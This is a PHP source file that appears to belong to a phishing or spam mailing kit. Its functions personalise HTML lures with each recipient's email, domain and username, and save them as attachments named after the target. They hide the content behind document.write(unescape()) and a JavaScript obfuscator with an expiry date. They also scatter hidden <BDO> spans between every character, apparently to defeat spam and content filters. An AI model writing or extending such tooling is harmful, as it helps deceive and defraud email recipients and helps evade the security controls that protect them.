<?php

require 'Obfuscator.php';

function fixdetails($text,$email) {

    $em=explode('@',$email);
    $emaildomain = substr(strrchr($email, "@"), 1);
    $bc=explode('.',$emaildomain);
    $chgcap=strtolower($bc[0]);
    $frmsite=ucfirst($chgcap);
    $emincap=strtolower($em[0]);
    $mename=ucfirst($emincap);
    #$secretemail= secret_mail($email);
    $getram= rand();
    $date = date("l, F j, Y");
    $time = date("g:i a");
    $hexemail = bin2hex($email);
    $base64email = base64_encode($email);

    $text = str_replace("{email}", $email, $text);
    $text = str_replace("{date}", $date , $text);
    $text = str_replace("{time}", $time , $text);
    $text = str_replace("{base64email}", $base64email , $text);
    $text = str_replace("{hexemail}", $hexemail , $text);
    $text = str_replace("{domain}", $emaildomain , $text);
    $text = str_replace("{frmsite}", $frmsite , $text);
    $text = str_replace("{mename}", $mename , $text);
    $text = str_replace("{username}", $mename , $text);
    $text = str_replace("{user}", $mename , $text);
    $text = str_replace("{random}", random_num(10) , $text);
    $text = str_replace("{year}", date("Y"), $text);
    $text = str_replace("{month}", date("F"), $text);
    $text = str_replace("{minute}", date("j"), $text);
    $text = str_replace("{dayofweek}", date("l"), $text);
    $text = str_replace("{secs}", date("s"), $text);
    #$text = str_replace("{sendername}", $sender_name, $text);
    $text = getInbetweenStrings($text);
    return $text;
    #echo $this->myUrlEncode($text);
    #return $this->myUrlEncode($text);
  }

  function getisp($ip='') {
    if ($ip=='') $ip = $_SERVER['REMOTE_ADDR'];
    $longisp = @gethostbyaddr($ip);
    $isp = explode('.', $longisp);
    $isp = array_reverse($isp);
    $tmp = $isp[1];
    if (preg_match("/\<(org?|com?|net)\>/i", $tmp)) {
    $myisp = $isp[2].'.'.$isp[1].'.'.$isp[0];
    } else {
    $myisp = $isp[1].'.'.$isp[0];
    }
    if (preg_match("/[0-9]{1,3}\.[0-9]{1,3}/", $myisp))
    return 'ISP lookup failed.';
    return $myisp;
}

function validate_email($email){
    $status=false;
    $regex='/^([a-zA-Z0-9])+([\.a-zA-Z0-9_-])*@([a-zA-Z0-9_-])+(\.[a-zA-Z0-9_-]+)*\.([a-zA-Z]{2,6})$/'; 
    if(preg_match($regex, $email)){$status=true;}
    return $status; 
}

function random_num($len) {
   $ch = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
   $l = strlen ($ch) - 1;
   $str = "";
   for ($i=0; $i < $len; $i++)
   {
       $x = rand (0, $l);
       $str .= $ch[$x];
   }
   return $str;
  }


function AddDate($value) {
    $ten_days_later = time() + $value*60*60*24;
    //echo 'It will be '.date('l, F j, Y', $ten_days_later).' '.$value.' days later.';
    $redate = date('l, F j, Y', $ten_days_later);
    return $redate;
  }

function getInbetweenStrings($str){
    //print("Before Encode: ".$str."\n\r\n\n");
    $pattern = "/base64{(.*?)}/";
    preg_match_all($pattern, $str, $matches,PREG_PATTERN_ORDER);

    $number = "/{number(.*?)}/";
    preg_match_all($number, $str, $m_number,PREG_PATTERN_ORDER);
    
    $random = "/{random(.*?)}/";
    preg_match_all($random, $str, $m_random,PREG_PATTERN_ORDER);

    $newdate = "/{date(.*?)}/";
    preg_match_all($newdate, $str, $n_date,PREG_PATTERN_ORDER);


    foreach ($m_number[0] as $numberf) {
        //print($numberf."\r\n");
        $betwn = '/\d+/';
        preg_match($betwn, $numberf, $mbtn);
        //print("inbetween: ".$mbtn[0]."\n");
        $nume=random_num($mbtn[0]);
        //print("Encoded: ".$nume."\n");
        $str = str_replace($numberf, $nume, $str);
    }

    foreach ($m_random[0] as $m_randomf) {
        //print($m_randomf."\r\n");
        $m_randombetwn = '/\d+/';
        preg_match($m_randombetwn, $m_randomf, $m_randommbtn);
        //print("inbetween: ".$m_randommbtn[0]."\n");
        $m_randomnume=random($m_randommbtn[0]);
        //print("Encoded: ".$m_randomnume."\n");
        $str = str_replace($m_randomf, $m_randomnume, $str);
    }

    foreach ($n_date[0] as $m_ddate) {
        //print($m_ddate."\r\n");
        $m_dat = '/\d+/';
        preg_match($m_dat, $m_ddate, $m_dbtn);
        //print("inbetween: ".$m_randommbtn[0]."\n");
        $m_dfoun=AddDate($m_dbtn[0]);
        //print("Encoded: ".$m_dfoun."\n");
        $str = str_replace($m_ddate, $m_dfoun, $str);
    }

    foreach ($matches[0] as $base64) {
        //print($base64."\r\n");
        $betw = '/{(.*)}/';
        preg_match($betw, $base64, $mbt);
        //print("inbetween: ".$mbt[1]."\n");
        $base64e=base64_encode($mbt[1]);
        //print("Encoded: ".$base64e."\n");
        $str = str_replace($base64, $base64e, $str);
    }
    //print("After Encode: ".$str."\n");
    return $str;
}

function random($len) {
   $ch = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   $l = strlen ($ch) - 1;
   $str = "";
   for ($i=0; $i < $len; $i++){
       $x = rand (0, $l);
       $str .= $ch[$x];
   }
   return $str;
}

function escapeJavaScriptText($string) 
{ 
    return str_replace("\n", '\n', str_replace('"', '\"', addcslashes(str_replace("\r", '', (string)$string), "\0..\37'\\"))); 
} 


function myUrlEncode($string) {
    return urlencode(mb_convert_encoding ($string, 'Windows-1252', "UTF-8"));
}

function escapecode($message,$javaescape=true,$obsfucate=false,$setexpire=""){
    //global $javaescape,$obsfucate,$setexpire ;

    if ($javaescape) {
        $message = rawurlencode($message);
        $message = "document.write(unescape('".$message."'))";
        //$jsCode = $message; //Simple JS code
        $message = "<script>" . $message . "</script>";
    }
    if ($obsfucate) {
        $hunter = new HunterObfuscator($message, true);
        if (!empty($setexpire)) {
            $hunter->setExpiration($setexpire); 
        }
        $message = $hunter->Obfuscate();
        $message = "<script>" . $message . "</script>";
    }
    return $message;

}


function BuildAttachFile($name='{email}.html',$email="test@mail.com",$javaescape=true,$obsfucate=false,$setexpire=""){

try {

    if ($content = (file_get_contents('file.html'))) {
        $content = fixdetails($content,$email);
        if ($javaescape || $obsfucate) {
            $content = escapecode($content,$javaescape,$obsfucate,$setexpire);
           // echo ($content); 
        }
        
    }else{
        throw new Exception('File "file.html" not found.');
    }

    if(!file_exists($name)){
        file_put_contents($name, $content, FILE_APPEND);
    }else{
        unlink($name);
        file_put_contents($name, $content, FILE_APPEND);
    }

} catch (Exception $e) {
    echo date("Y-m-d G:i:s").'     SERVER -> ATTACH error:  ['.$e->getMessage().'] '."\r\n";

}

return $name;
      
}

function startswith($string, $prefix) {
   return substr($string, 0, strlen($prefix)) == $prefix;
}

function mb_basename($path) {
    if (preg_match('@^.*[\\\\/]([^\\\\/]+)$@s', $path, $matches)) {
        return $matches[1];
    } else if (preg_match('@^([^\\\\/]+)$@s', $path, $matches)) {
        return $matches[1];
    }
    return '';
}

function CW0147($string, &$references) {

    static $counter  ;
    static $list  ;
    static $list_q  ;

    if (!isset($counter)) {
        $counter = 0 ;
        $list = array('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9');

        // See comments below - Many Thanks @revo
        usort($list, function($a,$b) { return strlen($b)< strlen($b) ; }); 

        $list_q = array_map('preg_quote', $list);
    }

    return preg_replace_callback('~('.implode('|',$list_q).')~',
        function($matches) use (&$counter, &$references){
            $counter++;
            $references[$counter] = $matches[0];
            return $matches[0].'<BDO>{time}{date}</BDO>' ;

    }, $string) ;
}

function CW0148($string){
    $matchess = [] ;
    

    #$string = str_replace('</head>', $style.'</head>', $string);
    $text_to_echo =  preg_replace_callback(
        "/(<([^.]+)>)([^<]+)(<\\/\\2>)/s", 
        function($matches){
            $text = CW0147($matches[3], $matchess);
            #$text = str_replace(array("text", "want"),array('TEXT', 'need'),$matches[3]);
            return $matches[1].$text.$matches[4];
        }, 
        $string
    );

    $strings = $text_to_echo;

    return $strings;
}

function CW0149($string){
    $style = '#Z[Time_own_format]S{
        PADDING: 10px; 
        TEXT-ALIGN: center; 
        MARGIN: 0px auto; 
        FONT-FAMILY: Arial; 
        FONT-SIZE: 16px; 
        COLOR: #F8F8F8; 
        WIDTH: 290px; 
        FONT-WEIGHT: bolder; 
        BACKGROUND-COLOR: #FF1F1F;
        }'."\r\n".

    '#k[Time_own_format]m { 
        display: none;
        height: px;
        font-size:px;
        }'."\r\n".

    '#soot {
        font-size: px;
        }'."\r\n".

    'BDO{
        display: none;
    }'."\r\n";

    if (strpos($string, '</style>') !== false) {
        $string = str_replace('</style>', $style.'</style>'."\r\n", $string);
    }else{
        $string = '<style>'."\r\n".$style.'</style>'."\r\n";

    }

    return $string;
}

function CW0146($html,$file=False){
    preg_match("/<body[^>]*>(.*?)<\/body>/is", $html, $matches);
    preg_match("/<style[^>]*>(.*?)<\/style>/is", $html, $style);
    $style = $style[0];
    $body = $matches[1];
    $newbody = CW0148($body);
    $newstyle = CW0149($style);
    #echo($newbody);
    #echo($newstyle);
    $htmlContent = '<html>'."\r\n".'<head>'."\r\n";
    $htmlContent .= $newstyle."\r\n";
    $htmlContent .= '</head>'."\r\n".'<body>'."\r\n";
    $htmlContent .= $newbody."\r\n";
    $htmlContent .= '</body>'."\r\n".'</html>'."\r\n";
    if($file){
        $newfmfile = "ENCRYPT_FM_".date('m_d_Y_h_i_a').".html";
        $myfile = fopen($newfmfile, "w") or die("Unable to open file!");
        $txt = $htmlContent."\n";
        fwrite($myfile, $txt);
        fclose($myfile);
        return $newfmfile;
    }else{
        return $htmlContent;
    }
}








